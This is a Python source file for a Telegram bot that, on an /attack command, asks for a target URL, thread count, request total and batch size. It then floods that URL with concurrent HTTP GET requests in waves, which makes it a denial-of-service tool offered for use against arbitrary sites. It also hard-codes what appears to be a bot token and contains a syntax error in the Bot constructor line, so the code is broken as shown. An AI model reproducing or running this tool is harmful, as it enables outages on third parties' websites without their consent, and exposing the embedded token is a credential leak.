import os
import asyncio
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor

API_TOKEN = os.environ["8479063488:AAHtyCytLIocdsvf9uYeTWkIfs9goH0678I"]

bot = Bot(token=8479063488:AAHtyCytLIocdsvf9uYeTWkIfs9goH0678I)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Define states
class AttackForm(StatesGroup):
    url = State()
    threads = State()
    total = State()
    batch = State()

# Request sending logic
async def send_request(session, url, task_id):
    try:
        async with session.get(url) as response:
            print(f"[{task_id}] ✅ {response.status}")
    except Exception as e:
        print(f"[{task_id}] ❌ {e}")

async def run_wave(url, start_id, wave_size, session):
    tasks = [send_request(session, url, start_id + i) for i in range(wave_size)]
    await asyncio.gather(*tasks)

async def run_attack(url, total_requests, concurrency, batch_size, user_id):
    connector = aiohttp.TCPConnector(limit=concurrency)
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for start in range(0, total_requests, batch_size):
            wave_size = min(batch_size, total_requests - start)
            await bot.send_message(user_id, f"🚀 Sending batch {start}-{start + wave_size}")
            await run_wave(url, start, wave_size, session)
            await asyncio.sleep(0.1)
    await bot.send_message(user_id, "🏁 Done!")

# Commands
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    await msg.reply("👋 Welcome! Send /attack to begin setup.")

@dp.message_handler(commands=['attack'])
async def attack_cmd(msg: types.Message):
    await AttackForm.url.set()
    await msg.reply("🔗 Enter target URL:")

@dp.message_handler(state=AttackForm.url)
async def process_url(msg: types.Message, state: FSMContext):
    await state.update_data(url=msg.text)
    await AttackForm.next()
    await msg.reply("🔧 Enter number of threads:")

@dp.message_handler(state=AttackForm.threads)
async def process_threads(msg: types.Message, state: FSMContext):
    try:
        threads = int(msg.text)
    except:
        return await msg.reply("❌ Please enter a valid number.")
    await state.update_data(threads=threads)
    await AttackForm.next()
    await msg.reply("📦 Enter total number of requests:")

@dp.message_handler(state=AttackForm.total)
async def process_total(msg: types.Message, state: FSMContext):
    try:
        total = int(msg.text)
    except:
        return await msg.reply("❌ Please enter a valid number.")
    await state.update_data(total=total)
    await AttackForm.next()
    await msg.reply("📤 Enter batch size:")

@dp.message_handler(state=AttackForm.batch)
async def process_batch(msg: types.Message, state: FSMContext):
    try:
        batch = int(msg.text)
    except:
        return await msg.reply("❌ Please enter a valid number.")

    await state.update_data(batch=batch)
    data = await state.get_data()
    await state.finish()

    url = data['url']
    threads = data['threads']
    total = data['total']
    batch = data['batch']

    await msg.reply(f"⚔️ Starting attack on {url}\n"
                    f"Threads: {threads}, Total: {total}, Batch: {batch}")
    await run_attack(url, total, threads, batch, msg.chat.id)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
